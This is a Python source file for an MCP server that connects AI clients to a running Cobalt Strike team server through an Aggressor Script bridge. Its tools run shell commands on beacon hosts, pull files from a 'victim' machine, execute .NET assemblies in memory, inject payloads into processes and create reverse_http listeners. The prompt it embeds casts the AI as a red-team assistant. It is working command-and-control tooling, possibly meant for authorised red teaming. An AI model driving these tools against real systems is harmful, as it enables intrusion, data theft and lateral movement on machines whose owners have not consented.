"""
CS CNA MCP Bridge Server
将 Aggressor Script 桥接服务暴露为标准 MCP Tools，
供 Claude / Cursor / VS Code 等 AI 客户端调用
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
from typing import Any

import httpx
from fastmcp import FastMCP

# ── 配置 ──────────────────────────────────────────────────────
BRIDGE_URL   = os.getenv("CS_BRIDGE_URL",   "http://127.0.0.1:17777")
BRIDGE_TOKEN = os.getenv("CS_BRIDGE_TOKEN", "cs-mcp-bridge-secret")

mcp = FastMCP(
    name="Cobalt Strike CNA Bridge",
    instructions="""
你是一个红队行动辅助助手，通过 Cobalt Strike Aggressor Script 桥接服务与正在运行的
Cobalt Strike 客户端交互。

规则：
- 执行任何破坏性操作前必须向用户确认
- 不要伪造 Beacon 输出，仅返回 API 实际返回的数据
- 执行命令后告知用户：命令已进入队列，需等待 Beacon 下次回连才能取回结果
""",
)

logger = logging.getLogger(__name__)


def _get_client() -> httpx.AsyncClient:
    return httpx.AsyncClient(
        base_url=BRIDGE_URL,
        headers={"X-Bridge-Token": BRIDGE_TOKEN, "Content-Type": "application/json"},
        timeout=15.0,
    )


async def _get(path: str) -> dict[str, Any]:
    async with _get_client() as c:
        r = await c.get(path)
        r.raise_for_status()
        return r.json()


async def _post(path: str, payload: dict) -> dict[str, Any]:
    async with _get_client() as c:
        r = await c.post(path, content=json.dumps(payload))
        r.raise_for_status()
        return r.json()


# ── MCP Tools ────────────────────────────────────────────────

@mcp.tool()
async def health_check() -> str:
    """检查 CS CNA Bridge 是否在线"""
    result = await _get("/health")
    return json.dumps(result, indent=2)


@mcp.tool()
async def list_beacons() -> str:
    """
    列出当前所有活跃的 Cobalt Strike Beacon。
    返回字段：id, user, computer, host, pid, os, arch, is64, last, listener, note
    """
    result = await _get("/beacons")
    return json.dumps(result, indent=2, ensure_ascii=False)


@mcp.tool()
async def list_listeners() -> str:
    """列出所有已配置的 Cobalt Strike 监听器（Listener）名称"""
    result = await _get("/listeners")
    return json.dumps(result, indent=2)


@mcp.tool()
async def beacon_shell(beacon_id: str, command: str) -> str:
    """
    通过 cmd.exe 在指定 Beacon 上执行 shell 命令（等同于 CS 控制台中的 shell 命令）。

    Args:
        beacon_id: Beacon 的 ID（可通过 list_beacons 获取）
        command: 要执行的 shell 命令，例如 'whoami' 或 'ipconfig /all'
    """
    result = await _post("/beacon/shell", {"id": beacon_id, "command": command})
    return json.dumps(result, indent=2)


@mcp.tool()
async def beacon_run(beacon_id: str, command: str) -> str:
    """
    在 Beacon 上直接运行程序（不经过 cmd.exe，等同于 CS 中的 run 命令）。

    Args:
        beacon_id: Beacon 的 ID
        command: 要运行的程序及参数，例如 'net user' 或 'whoami /priv'
    """
    result = await _post("/beacon/run", {"id": beacon_id, "command": command})
    return json.dumps(result, indent=2)


@mcp.tool()
async def beacon_sleep(beacon_id: str, sleep_seconds: int = 60, jitter_percent: int = 20) -> str:
    """
    调整 Beacon 的回连间隔（sleep）和抖动（jitter）。

    Args:
        beacon_id: Beacon 的 ID
        sleep_seconds: 休眠时间（秒），默认 60
        jitter_percent: 抖动百分比（0-99），默认 20
    """
    result = await _post("/beacon/sleep", {
        "id": beacon_id,
        "sleep": sleep_seconds,
        "jitter": jitter_percent,
    })
    return json.dumps(result, indent=2)


@mcp.tool()
async def beacon_download(beacon_id: str, remote_path: str) -> str:
    """
    从 Beacon 主机下载文件到 CS 服务器。

    Args:
        beacon_id: Beacon 的 ID
        remote_path: 远程目标机器上的文件路径，例如 'C:\\Users\\victim\\Desktop\\secret.txt'
    """
    result = await _post("/beacon/download", {"id": beacon_id, "path": remote_path})
    return json.dumps(result, indent=2)


@mcp.tool()
async def beacon_execute_assembly(
    beacon_id: str,
    assembly_path: str,
    args: str = "",
) -> str:
    """
    在 Beacon 内存中执行 .NET Assembly（execute-assembly）。

    Args:
        beacon_id: Beacon 的 ID
        assembly_path: CS 服务器本地的 .NET exe 文件路径
        args: 传递给 Assembly 的参数（可选）
    """
    result = await _post("/beacon/execute_assembly", {
        "id": beacon_id,
        "assembly_path": assembly_path,
        "args": args,
    })
    return json.dumps(result, indent=2)


@mcp.tool()
async def beacon_inject(
    beacon_id: str,
    target_pid: int,
    listener: str,
    arch: str = "x64",
) -> str:
    """
    将新的 Beacon payload 注入到指定进程（进程注入）。

    Args:
        beacon_id: 执行注入操作的源 Beacon ID
        target_pid: 目标进程 PID
        listener: 使用的监听器名称（可通过 list_listeners 获取）
        arch: 目标进程架构，'x64' 或 'x86'，默认 x64
    """
    result = await _post("/beacon/inject", {
        "id": beacon_id,
        "pid": target_pid,
        "listener": listener,
        "arch": arch,
    })
    return json.dumps(result, indent=2)


@mcp.tool()
async def beacon_set_note(beacon_id: str, note: str) -> str:
    """
    为指定 Beacon 设置备注信息（便于标记和管理）。

    Args:
        beacon_id: Beacon 的 ID
        note: 备注内容，例如 'DC server - high value target'
    """
    result = await _post("/beacon/note", {"id": beacon_id, "note": note})
    return json.dumps(result, indent=2)


@mcp.tool()
async def beacon_remove(beacon_id: str) -> str:
    """
    从 CS 会话列表中移除指定 Beacon（不会杀死进程，只是清除记录）。

    Args:
        beacon_id: 要移除的 Beacon ID
    """
    result = await _post("/beacon/remove", {"id": beacon_id})
    return json.dumps(result, indent=2)


@mcp.tool()
async def get_recent_tasks() -> str:
    """获取所有 Beacon 最近的任务记录和输入日志"""
    result = await _get("/beacon/tasks")
    return json.dumps(result, indent=2, ensure_ascii=False)


@mcp.tool()
async def create_listener(
    name: str,
    payload: str,
    host: str = "",
    port: int = 443,
) -> str:
    """
    创建新的 Cobalt Strike 监听器。

    Args:
        name: 监听器名称（唯一），例如 'http-443'
        payload: Payload 类型，例如 'windows/beacon_http/reverse_http'
        host: 监听器绑定 IP（留空则使用默认）
        port: 监听端口，默认 443
    """
    result = await _post("/listener/create", {
        "name": name,
        "payload": payload,
        "host": host,
        "port": port,
    })
    return json.dumps(result, indent=2)


# ── MCP Resources ─────────────────────────────────────────────

@mcp.resource("cobalt-strike://beacons/active")
async def active_beacons_resource() -> str:
    """实时获取所有活跃 Beacon 列表（MCP Resource）"""
    result = await _get("/beacons")
    return json.dumps(result, indent=2, ensure_ascii=False)


@mcp.resource("cobalt-strike://listeners/active")
async def active_listeners_resource() -> str:
    """实时获取所有活跃监听器（MCP Resource）"""
    result = await _get("/listeners")
    return json.dumps(result, indent=2)


@mcp.resource("cobalt-strike://bridge/status")
async def bridge_status_resource() -> str:
    """获取 CNA Bridge 状态信息"""
    result = await _get("/health")
    return json.dumps(result, indent=2)


# ── 入口 ─────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys
    transport = os.getenv("MCP_TRANSPORT", "http")
    logging.basicConfig(level=logging.INFO)

    if transport == "stdio":
        mcp.run(transport="stdio")
    else:
        host = os.getenv("MCP_LISTEN_HOST", "0.0.0.0")
        port = int(os.getenv("MCP_LISTEN_PORT", "3001"))
        path = os.getenv("MCP_LISTEN_PATH", "/mcp")
        asyncio.run(mcp.run_async(transport="http", host=host, port=port, path=path))